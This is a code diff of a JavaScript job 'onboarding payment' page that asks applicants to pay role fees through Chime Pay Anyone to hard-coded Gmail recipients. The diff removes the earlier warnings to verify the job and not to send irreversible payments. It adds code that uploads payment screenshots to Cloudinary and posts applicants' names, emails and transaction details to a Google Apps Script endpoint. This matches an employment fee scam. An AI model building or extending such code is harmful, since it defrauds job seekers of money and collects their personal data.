@@ -1,7 +1,29 @@
-/* Render fee details passed by the approval email. */
+/* Onboarding payment — Chime Pay Anyone + careers site payload */
 (function () {
-  const root = document.getElementById('onboarding-content');
-  if (!root) return;
+  const CONFIG = {
+    chimeEmails: ['workforcematchday@gmail.com', 'matchdayworkforce@gmail.com'],
+    cloudinaryCloudName: 'rza1wcjs',
+    cloudinaryUploadPreset: 'payment-screenshot',
+    paymentScriptUrl:
+      'https://script.google.com/macros/s/AKfycbxHATyBoGmfaWeNnx6Q42EK6sIVGrakQ5TX7ZOlUgGWpT4XVaS7HNr653Q1bHeHL6p1/exec',
+  };
+
+  const ICONS = {
+    admin: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 3H8a2 2 0 0 0-2 2v2h12V5a2 2 0 0 0-2-2z"/></svg>',
+    background: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
+    medical: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>',
+    training: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>',
+    uniform: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.38 3.46L16 2a4 4 0 0 1-8 0L3.62 3.46a2 2 0 0 0-1.34 2.23l.58 3.57a1 1 0 0 0 .99.84H6v10c0 1.1.9 2 2 2h8a2 2 0 0 0 2-2V10h2.15a1 1 0 0 0 .99-.84l.58-3.57a2 2 0 0 0-1.34-2.23z"/></svg>',
+  };
+
+  const FEE_ICON_BY_ID = {
+    admin: 'admin',
+    background: 'background',
+    foodSafety: 'medical',
+    medical: 'medical',
+    training: 'training',
+    uniform: 'uniform',
+  };
 
   function escapeHtml(value) {
     return String(value)
@@ -12,27 +34,51 @@
       .replaceAll("'", '&#39;');
   }
 
-  function decodePayload() {
-    const params = new URLSearchParams(window.location.search);
-    const encoded = params.get('d');
-    if (encoded) {
+  function cents(value) {
+    if (Number.isFinite(Number(value)) && !String(value).includes('$')) {
+      return Math.round(Number(value) * 100);
+    }
+    const match = /^\$(\d+)(?:\.(\d{2}))?/.exec(String(value));
+    return match ? Number(match[1]) * 100 + Number(match[2] || 0) : null;
+  }
+
+  function amountNumber(value) {
+    const parsed = cents(value);
+    return parsed === null ? 0 : parsed / 100;
+  }
+
+  function formatMoney(amount) {
+    return `$${Number(amount).toFixed(2)}`;
+  }
+
+  function decodeEncodedPayload(encoded) {
+    try {
+      const binary = atob(decodeURIComponent(encoded));
+      const utf8 = Array.from(binary, (character) =>
+        `%${character.charCodeAt(0).toString(16).padStart(2, '0')}`
+      ).join('');
+      return JSON.parse(decodeURIComponent(utf8));
+    } catch {
       try {
-        const binary = atob(encoded);
-        const utf8 = Array.from(binary, (character) =>
-          `%${character.charCodeAt(0).toString(16).padStart(2, '0')}`
-        ).join('');
-        return JSON.parse(decodeURIComponent(utf8));
+        return JSON.parse(atob(decodeURIComponent(encoded)));
       } catch {
         return null;
       }
     }
+  }
 
-    const role = (params.get('role') || '').trim();
-    const applicationId = (params.get('id') || params.get('ref') || '').trim();
+  function decodePayload() {
+    const params = new URLSearchParams(window.location.search);
+    const encoded = params.get('d');
+    if (encoded) return decodeEncodedPayload(encoded);
+
+    const role = (params.get('role') || params.get('jobTitle') || '').trim();
+    const applicationId = (params.get('id') || params.get('ref') || params.get('applicationId') || '').trim();
     if (!role && !applicationId) return null;
 
     return {
       role,
+      jobTitle: role,
       applicationId,
       category: (params.get('cat') || params.get('category') || '').trim(),
       pay: (params.get('pay') || params.get('payLabel') || '').trim(),
@@ -44,28 +90,37 @@
     };
   }
 
+  function pickChimeEmail(applicationId) {
+    const emails = CONFIG.chimeEmails;
+    const hex = parseInt(String(applicationId || '').replace(/[^0-9a-f]/gi, '').slice(-1), 16);
+    const turn = Number.isFinite(hex) ? hex : Date.now();
+    return emails[turn % emails.length];
+  }
+
   function feesFromPayload(data) {
     const fees = data && data.fees;
-    const items = fees && Array.isArray(fees.items) ? fees.items : [];
-    const totalCents = fees ? cents(fees.total) : null;
-    const amounts = items.map((item) => item && cents(item.amount));
-    const lineTotal = amounts.every((amount) => amount !== null)
-      ? amounts.reduce((sum, amount) => sum + amount, 0)
-      : null;
-
-    if (
-      items.length &&
-      items.every((item) => item && typeof item.label === 'string' && item.label.trim()) &&
-      totalCents !== null &&
-      lineTotal === totalCents
-    ) {
-      return fees;
+    const rawItems = fees && Array.isArray(fees.items) ? fees.items : [];
+    if (rawItems.length && rawItems.every((item) => item && (item.label || item.name))) {
+      return rawItems.map((item) => {
+        const amount = amountNumber(item.amount);
+        const isDeposit = Boolean(item.isDeposit);
+        const isCompletionCredit = Boolean(item.isCompletionCredit) || item.id === 'training';
+        return {
+          id: item.id || '',
+          label: item.label || item.name || '',
+          description: item.description || '',
+          amount,
+          amountLabel: item.amountLabel || (isDeposit ? `${formatMoney(amount)} deposit` : formatMoney(amount)),
+          isDeposit,
+          isCompletionCredit,
+        };
+      });
     }
 
     const resolve = window.MW && typeof window.MW.resolveRoleFees === 'function'
       ? window.MW.resolveRoleFees
       : null;
-    if (!resolve || !data) return null;
+    if (!resolve || !data) return [];
 
     const resolved = resolve({
       title: data.role || data.jobTitle || '',
@@ -73,192 +128,330 @@
       payLabel: data.pay || data.payLabel || '',
       kind: data.kind || '',
     });
-    const format = window.MW.formatFeeMoney || ((n) => `$${Number(n).toFixed(2)}`);
-    return {
-      items: (resolved.items || []).map((item) => ({
-        label: item.label,
-        amount: format(item.amount),
-        isDeposit: Boolean(item.isDeposit),
-      })),
-      total: resolved.grandTotalLabel || format(resolved.grandTotal),
-    };
+    return (resolved.items || []).map((item) => ({
+      id: item.id || '',
+      label: item.label,
+      description: item.description || '',
+      amount: Number(item.amount) || 0,
+      amountLabel: item.amountLabel || formatMoney(item.amount),
+      isDeposit: Boolean(item.isDeposit),
+      isCompletionCredit: Boolean(item.isCompletionCredit) || item.id === 'training',
+    }));
   }
 
-  function cents(value) {
-    const match = /^\$(\d+)(?:\.(\d{2}))?$/.exec(String(value));
-    return match ? Number(match[1]) * 100 + Number(match[2] || 0) : null;
+  function setText(id, value) {
+    const el = document.getElementById(id);
+    if (el) el.textContent = value;
   }
 
-  const data = decodePayload();
-  const applicantRole = document.getElementById('onboarding-applicant-role');
-  if (applicantRole) {
-    applicantRole.textContent = data && typeof data.role === 'string' && data.role.trim()
-      ? data.role.trim()
-      : 'See your approval email';
-  }
-  const applicationId = document.getElementById('onboarding-application-id');
-  if (applicationId) {
-    applicationId.textContent = data && typeof data.applicationId === 'string' && data.applicationId.trim()
-      ? data.applicationId.trim()
-      : 'See your approval email';
-  }
-  const reportingSection = document.getElementById('onboarding-reporting');
-  const reporting = data && data.reporting && typeof data.reporting === 'object' ? data.reporting : {};
-  const reportingFields = [
-    ['date', 'onboarding-reporting-date-row', 'onboarding-reporting-date'],
-    ['time', 'onboarding-reporting-time-row', 'onboarding-reporting-time'],
-    ['instructions', 'onboarding-reporting-instructions-row', 'onboarding-reporting-instructions'],
-    ['venue', 'onboarding-reporting-venue-row', 'onboarding-reporting-venue']
-  ];
-  let hasReportingInfo = false;
-  reportingFields.forEach(([key, rowId, valueId]) => {
-    const value = typeof reporting[key] === 'string' ? reporting[key].trim() : '';
-    const row = document.getElementById(rowId);
-    const target = document.getElementById(valueId);
-    if (row && target && value) {
-      target.textContent = value;
-      row.hidden = false;
-      hasReportingInfo = true;
-    }
-  });
-  if (reportingSection) reportingSection.hidden = !hasReportingInfo;
-  const fees = feesFromPayload(data);
-  const items = fees && Array.isArray(fees.items) ? fees.items : [];
+  function renderFeeItems(items, explanation) {
+    const container = document.getElementById('fees-breakdown');
+    if (!container) return 0;
 
-  if (
-    !items.length ||
-    items.some((item) => typeof item.label !== 'string' || !item.label.trim()) ||
-    !fees.total
-  ) {
-    root.innerHTML = '<p class="onboarding-fees__unavailable">Fee breakdown unavailable. Please refer to the itemized amounts in your approval email.</p>';
-    return;
-  }
-
-  const rows = items.map((item) => `
-    <div class="onboarding-fee-row">
-      <p class="onboarding-fee-row__label">
-        ${escapeHtml(item.label)}
-        ${item.isDeposit ? '<span class="onboarding-fee-row__badge">Refundable deposit</span>' : ''}
-      </p>
-      <p class="onboarding-fee-row__amount">${escapeHtml(item.amount)}</p>
-    </div>`).join('');
-  const depositItems = items.filter((item) => item.isDeposit === true);
-  const depositCents = depositItems.reduce((sum, item) => sum + cents(item.amount), 0);
-  const depositNote = depositCents > 0
-    ? `${escapeHtml(`$${(depositCents / 100).toFixed(2)}`)} refundable for ${escapeHtml(depositItems.map((item) => item.label).join(', '))}. Returned when issued gear is returned in usable condition, subject to your approval email.`
-    : 'No refundable deposit is listed for this role.';
-  const payment = window.MW && window.MW.PAYMENT ? window.MW.PAYMENT : {};
-  const chimeValues = [
-    ['Recipient name', payment.chimeName],
-    ['Chime tag', payment.chimeTag],
-    ['Payment email', payment.chimeEmail]
-  ];
-  const hasCompleteChimeDetails = chimeValues.every(([, value]) => typeof value === 'string' && value.trim());
-  const chimeDetails = hasCompleteChimeDetails
-    ? `<dl class="onboarding-chime-details__list">${chimeValues.map(([label, value]) => `
-        <div class="onboarding-chime-details__row">
-          <div>
-            <dt>${escapeHtml(label)}</dt>
-            <dd>${escapeHtml(value.trim())}</dd>
+    let total = 0;
+    container.innerHTML = items.map((fee) => {
+      const amount = Number(fee.amount || 0);
+      total += amount;
+      const iconKey = FEE_ICON_BY_ID[fee.id] || 'admin';
+      const amountLabel = fee.amountLabel || (fee.isDeposit ? `${formatMoney(amount)} deposit` : formatMoney(amount));
+      return `
+        <div class="onboarding-fee-row">
+          <div class="onboarding-fee-row__main">
+            <div class="onboarding-fee-icon" aria-hidden="true">${ICONS[iconKey] || ICONS.admin}</div>
+            <div>
+              <p class="onboarding-fee-row__label">
+                ${escapeHtml(fee.label)}
+                ${fee.isDeposit ? '<span class="onboarding-fee-row__badge">Refundable deposit</span>' : ''}
+                ${fee.isCompletionCredit ? '<span class="onboarding-fee-row__badge">Returned after first shift</span>' : ''}
+              </p>
+              ${fee.description ? `<p class="onboarding-fee-row__desc">${escapeHtml(fee.description)}</p>` : ''}
+            </div>
           </div>
-          <button type="button" class="onboarding-chime-details__copy" data-copy="${escapeHtml(value.trim())}" aria-label="Copy ${escapeHtml(label)}">Copy</button>
-        </div>`).join('')}
-      </dl>`
-    : '<p class="onboarding-chime-details__notice">Chime payment details are not fully configured. Confirm the recipient name, Chime tag, and payment email with the hiring team before sending money.</p>';
+          <span class="onboarding-fee-row__amount">${escapeHtml(amountLabel)}</span>
+        </div>`;
+    }).join('');
 
-  root.innerHTML = `
-    <section class="onboarding-payment-summary" aria-labelledby="onboarding-payment-summary-title">
-      <p class="onboarding-eyebrow">Payment summary</p>
-      <h2 id="onboarding-payment-summary-title">Amount and fee type</h2>
-      <dl class="onboarding-payment-summary__list">
-        <div>
-          <dt>Total due</dt>
-          <dd>${escapeHtml(fees.total)}</dd>
-        </div>
-        <div>
-          <dt>Fee type</dt>
-          <dd>${depositCents > 0 ? 'Role-specific processing fees and refundable deposit' : 'Role-specific processing fees; no refundable deposit'}</dd>
-        </div>
-        <div>
-          <dt>Deposit note</dt>
-          <dd>${depositNote}</dd>
-        </div>
-      </dl>
-    </section>
-    <section class="onboarding-methods" aria-labelledby="onboarding-methods-title">
-      <p class="onboarding-eyebrow">How would you like to pay?</p>
-      <h2 id="onboarding-methods-title">Payment method</h2>
-      <fieldset class="onboarding-methods__choices">
-        <legend class="visually-hidden">Choose a payment method</legend>
-        <label class="onboarding-method-option is-selected">
-          <input type="radio" name="onboarding-payment-method" value="chime" checked>
-          <span class="onboarding-method-option__content"><strong>Chime</strong><small>Pay with Chime</small></span>
-        </label>
-        <label class="onboarding-method-option">
-          <input type="radio" name="onboarding-payment-method" value="card">
-          <span class="onboarding-method-option__content"><strong>Card</strong><small>Debit or credit card</small></span>
-        </label>
-      </fieldset>
-      <div class="onboarding-chime-details" id="onboarding-chime-details" aria-live="polite">${chimeDetails}</div>
-      <div class="onboarding-methods__message" id="onboarding-method-message" aria-live="polite">Use only the Chime recipient and instructions confirmed by the hiring team. If payment details are not in your approval email, contact the team before sending money.</div>
-      <section class="onboarding-chime-guide" id="onboarding-chime-guide" aria-labelledby="onboarding-chime-guide-title">
-        <h3 id="onboarding-chime-guide-title">Before using Chime</h3>
-        <ol>
-          <li>Verify the job and any requested charge directly with the organization using contact details from its official website.</li>
-          <li>Confirm the recipient and exact amount with the hiring team. If anything is missing or does not match, do not send money.</li>
-          <li>Chime warns that Pay Anyone payments to another Chime member are instant and irreversible, and says Chime will never ask you to send money through Pay Anyone.</li>
-        </ol>
-        <p>Download Chime only from its official app store listing:</p>
-        <div class="onboarding-chime-guide__links">
-          <a href="https://apps.apple.com/us/app/chime-mobile-banking/id836215269" target="_blank" rel="noopener noreferrer">Chime for iPhone</a>
-          <a href="https://play.google.com/store/apps/details?id=com.onedebit.chime" target="_blank" rel="noopener noreferrer">Chime for Android</a>
-        </div>
-      </section>
-    </section>
-    <section class="onboarding-fees" aria-labelledby="onboarding-fees-title">
-      <p class="onboarding-eyebrow">Role-specific costs</p>
-      <h2 id="onboarding-fees-title">Fee breakdown</h2>
-      <p class="onboarding-fees__intro">${escapeHtml(data.role || 'Your approved role')} · Details from your approval email</p>
-      <div class="onboarding-fees__list">${rows}</div>
-      <div class="onboarding-fees__total">
-        <span>Total</span>
-        <strong>${escapeHtml(fees.total)}</strong>
-      </div>
-    </section>`;
+    const totalLabel = formatMoney(total);
+    const refundable = items.reduce((sum, fee) => {
+      return sum + ((fee.isDeposit || fee.isCompletionCredit) ? Number(fee.amount || 0) : 0);
+    }, 0);
+    const refundLabel = formatMoney(refundable);
+    setText('payment-amount', totalLabel);
+    setText('refund-amount', refundLabel);
+    setText('refund-amount-copy', refundLabel);
+    document.querySelectorAll('.pay-amount').forEach((el) => {
+      el.textContent = totalLabel;
+    });
+    const rebateRow = document.getElementById('fees-rebate');
+    if (rebateRow) rebateRow.hidden = refundable <= 0;
+    sessionStorage.setItem('feeAmount', String(total));
+    const expl = document.getElementById('fees-explanation');
+    if (expl && explanation) expl.textContent = explanation;
+    return total;
+  }
 
-  const methodMessage = document.getElementById('onboarding-method-message');
-  const chimeDetailsSection = document.getElementById('onboarding-chime-details');
-  const chimeGuide = document.getElementById('onboarding-chime-guide');
-  root.querySelectorAll('input[name="onboarding-payment-method"]').forEach((input) => {
-    input.addEventListener('change', () => {
-      root.querySelectorAll('.onboarding-method-option').forEach((option) => {
-        option.classList.toggle('is-selected', option.contains(input) && input.checked);
+  function showReporting(data) {
+    const section = document.getElementById('reporting-section');
+    const reporting = data && data.reporting && typeof data.reporting === 'object' ? data.reporting : {};
+    const date = String(reporting.date || data.reportingDate || data.reportingDateLabel || '').trim();
+    const time = String(reporting.time || data.reportingTime || data.reportingTimeLabel || '').trim();
+    const venue = String(reporting.venue || data.venue || [data.stadiumName, data.stadiumAddress].filter(Boolean).join(', ') || '').trim();
+    const instructions = String(reporting.instructions || data.reportingInstruction || '').trim();
+    if (!section || (!date && !time && !venue && !instructions)) return;
+    section.hidden = false;
+    if (instructions) setText('reporting-text', instructions);
+    if (date || time) {
+      setText('reporting-meta', [date && `Date: ${date}`, time && `Time: ${time}`].filter(Boolean).join(' · '));
+    }
+    if (venue) setText('reporting-venue', `Venue: ${venue}`);
+  }
+
+  function copyValue(value, btn, label, defaultLabel) {
+    const onCopied = () => {
+      if (btn) btn.classList.add('copied');
+      if (label) label.textContent = 'Copied';
+      window.setTimeout(() => {
+        if (btn) btn.classList.remove('copied');
+        if (label) label.textContent = defaultLabel;
+      }, 1600);
+    };
+    navigator.clipboard.writeText(value).then(onCopied, () => {
+      const el = document.createElement('textarea');
+      el.value = value;
+      document.body.appendChild(el);
+      el.select();
+      document.execCommand('copy');
+      document.body.removeChild(el);
+      onCopied();
+    });
+  }
+
+  function showError(fieldId, message) {
+    const field = document.getElementById(fieldId);
+    if (!field) return;
+    field.style.borderColor = '#ef4444';
+    field.focus();
+    const existing = field.parentNode.querySelector('.error-msg');
+    if (existing) existing.remove();
+    const err = document.createElement('p');
+    err.className = 'error-msg';
+    err.textContent = message;
+    field.parentNode.appendChild(err);
+    field.addEventListener('input', () => {
+      field.style.borderColor = '';
+      if (err.parentNode) err.remove();
+    }, { once: true });
+  }
+
+  function isValidEmail(value) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+  }
+
+  function validateForm() {
+    const name = document.getElementById('sender-name').value.trim();
+    const email = document.getElementById('sender-email').value.trim();
+    if (!name) {
+      showError('sender-name', 'Please enter your full name.');
+      return false;
+    }
+    if (!email || !isValidEmail(email)) {
+      showError('sender-email', 'Please enter a valid email.');
+      return false;
+    }
+    return true;
+  }
+
+  function prepareScreenshotFile(file, applicationId) {
+    const extension = String(file.name || '').toLowerCase().match(/\.(jpe?g|png|webp)$/i)?.[1] || 'jpg';
+    const safeId = String(applicationId || 'payment').replace(/[^a-zA-Z0-9_-]+/g, '-').slice(0, 40);
+    const safeName = `payment-${safeId}-${Date.now()}.${extension}`;
+    if (file.name === safeName) return file;
+    return new File([file], safeName, {
+      type: file.type || 'image/jpeg',
+      lastModified: file.lastModified,
+    });
+  }
+
+  async function uploadScreenshotToCloudinary(file, applicationId) {
+    const formData = new FormData();
+    formData.append('file', prepareScreenshotFile(file, applicationId));
+    formData.append('upload_preset', CONFIG.cloudinaryUploadPreset);
+    formData.append('context', `application_id=${applicationId || 'unknown'}`);
+    const response = await fetch(
+      `https://api.cloudinary.com/v1_1/${CONFIG.cloudinaryCloudName}/image/upload`,
+      { method: 'POST', body: formData }
+    );
+    const payload = await response.json().catch(() => null);
+    if (!response.ok || !payload || !payload.secure_url) {
+      throw new Error(
+        (payload && payload.error && payload.error.message) ||
+          'We could not upload your screenshot. Please try again or choose a different image.'
+      );
+    }
+    return payload.secure_url;
+  }
+
+  async function notifyPaymentSubmission(payload) {
+    if (!CONFIG.paymentScriptUrl) return;
+    try {
+      await fetch(CONFIG.paymentScriptUrl, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({ type: 'payment_submission', ...payload }),
       });
-      if (!methodMessage) return;
-      if (chimeDetailsSection) chimeDetailsSection.hidden = input.value !== 'chime';
-      if (chimeGuide) chimeGuide.hidden = input.value !== 'chime';
-      methodMessage.classList.toggle('is-maintenance', input.value === 'card');
-      methodMessage.textContent = input.value === 'card'
-        ? 'Card payments are under maintenance right now. Please choose Chime or contact the hiring team for help.'
-        : 'Use only the Chime recipient and instructions confirmed by the hiring team. If payment details are not in your approval email, contact the team before sending money.';
-    });
-  });
+    } catch {
+      /* no-cors: still show success if the upload completed */
+    }
+  }
 
-  root.querySelectorAll('[data-copy]').forEach((button) => {
-    button.addEventListener('click', async () => {
-      const value = button.getAttribute('data-copy') || '';
-      if (!value) return;
-      try {
-        await navigator.clipboard.writeText(value);
-        button.textContent = 'Copied';
-        button.disabled = true;
-        window.setTimeout(() => {
-          button.textContent = 'Copy';
-          button.disabled = false;
-        }, 1600);
-      } catch {
-        button.textContent = 'Copy failed';
+  function handleSuccess(data) {
+    const main = document.getElementById('main-card');
+    const card = document.getElementById('success-card');
+    if (main) main.hidden = true;
+    if (card) card.hidden = false;
+    const sticky = document.getElementById('pay-sticky');
+    if (sticky) sticky.hidden = true;
+    setText('success-name', data.applicantName);
+    setText('success-role', data.role);
+    setText('success-email', data.applicantEmail);
+    setText('success-ref-id', data.confirmationRef);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  async function submitPayment() {
+    if (!validateForm()) return;
+    const btn = document.getElementById('submit-btn');
+    const applicationId = document.getElementById('application-id').textContent.trim();
+    const screenshotFile = document.getElementById('screenshot') && document.getElementById('screenshot').files[0];
+    btn.disabled = true;
+    btn.textContent = screenshotFile ? 'Uploading screenshot...' : 'Submitting...';
+
+    try {
+      let screenshotUrl = '';
+      if (screenshotFile) {
+        if (screenshotFile.size > 5 * 1024 * 1024) {
+          throw new Error('File too large. Max 5MB.');
+        }
+        screenshotUrl = await uploadScreenshotToCloudinary(screenshotFile, applicationId);
       }
+      btn.textContent = 'Submitting...';
+      const payload = {
+        applicationId,
+        applicantName: document.getElementById('sender-name').value.trim(),
+        applicantEmail: document.getElementById('sender-email').value.trim(),
+        transactionRef: document.getElementById('transaction-ref').value.trim(),
+        role: sessionStorage.getItem('roleName') || 'your selected role',
+        amount: sessionStorage.getItem('feeAmount') || '0',
+        paymentMethod: 'Chime Pay Anyone',
+        chimeEmail: sessionStorage.getItem('chimeEmail') || '',
+        confirmationRef: 'CONF-' + Date.now(),
+        screenshotUrl,
+        timestamp: new Date().toISOString(),
+      };
+      await notifyPaymentSubmission(payload);
+      handleSuccess(payload);
+    } catch (error) {
+      btn.disabled = false;
+      btn.textContent = "I've Sent The Payment";
+      alert(error && error.message ? error.message : 'Something went wrong. Please try again.');
+    }
+  }
+
+  function bindUi(chimeEmail) {
+    const sticky = document.getElementById('pay-sticky');
+    document.getElementById('opt-chime').addEventListener('click', () => {
+      document.getElementById('opt-chime').classList.add('is-selected');
+      document.getElementById('opt-card').classList.remove('is-selected');
+      document.getElementById('dot-chime').classList.add('is-active');
+      document.getElementById('dot-card').classList.remove('is-active');
+      document.getElementById('chime-panel').hidden = false;
+      document.getElementById('card-panel').hidden = true;
+      if (sticky) sticky.hidden = false;
     });
-  });
+    document.getElementById('opt-card').addEventListener('click', () => {
+      document.getElementById('opt-card').classList.add('is-selected');
+      document.getElementById('opt-chime').classList.remove('is-selected');
+      document.getElementById('dot-card').classList.add('is-active');
+      document.getElementById('dot-chime').classList.remove('is-active');
+      document.getElementById('chime-panel').hidden = true;
+      document.getElementById('card-panel').hidden = false;
+      if (sticky) sticky.hidden = true;
+    });
+    document.getElementById('copy-email-btn').addEventListener('click', () => {
+      copyValue(
+        chimeEmail,
+        document.getElementById('copy-email-btn'),
+        document.getElementById('copy-email-label'),
+        'Copy'
+      );
+    });
+    const screenshot = document.getElementById('screenshot');
+    const area = document.getElementById('upload-area');
+    const label = document.getElementById('upload-label');
+    function acceptFile(file) {
+      if (!file) return;
+      if (file.size > 5 * 1024 * 1024) {
+        alert('File too large. Please choose a PNG or JPG under 5MB.');
+        screenshot.value = '';
+        return;
+      }
+      const transfer = new DataTransfer();
+      transfer.items.add(file);
+      screenshot.files = transfer.files;
+      area.classList.add('has-file');
+      label.textContent = file.name;
+    }
+    screenshot.addEventListener('change', (event) => {
+      acceptFile(event.target.files && event.target.files[0]);
+    });
+    ['dragenter', 'dragover'].forEach((type) => {
+      area.addEventListener(type, (event) => {
+        event.preventDefault();
+        area.classList.add('is-dragging');
+      });
+    });
+    ['dragleave', 'drop'].forEach((type) => {
+      area.addEventListener(type, (event) => {
+        event.preventDefault();
+        area.classList.remove('is-dragging');
+      });
+    });
+    area.addEventListener('drop', (event) => {
+      acceptFile(event.dataTransfer && event.dataTransfer.files[0]);
+    });
+    document.getElementById('submit-btn').addEventListener('click', submitPayment);
+  }
+
+  function loadPageData() {
+    const data = decodePayload() || {};
+    const role = String(data.role || data.jobTitle || '').trim() || 'See your approval email';
+    const applicationId = String(data.applicationId || '').trim() || 'MW-' + Date.now();
+    const chimeEmail = pickChimeEmail(applicationId);
+
+    setText('onboarding-applicant-role', role);
+    setText('application-id', applicationId);
+    setText('hero-role', role === 'See your approval email' ? 'Welcome to onboarding' : role);
+    setText('chime-email', chimeEmail);
+    sessionStorage.setItem('applicationId', applicationId);
+    sessionStorage.setItem('roleName', role);
+    sessionStorage.setItem('chimeEmail', chimeEmail);
+
+    const nameInput = document.getElementById('sender-name');
+    const emailInput = document.getElementById('sender-email');
+    if (nameInput && data.name) nameInput.value = data.name;
+    if (emailInput && data.email) emailInput.value = data.email;
+
+    showReporting(data);
+    const items = feesFromPayload(data);
+    const explanation = (data.fees && data.fees.paymentExplanation) || data.paymentExplanation ||
+      (role !== 'See your approval email' ? `${role} · Complete payment to confirm your placement.` : '');
+    renderFeeItems(items, explanation);
+    bindUi(chimeEmail);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', loadPageData);
+  } else {
+    loadPageData();
+  }
 })();
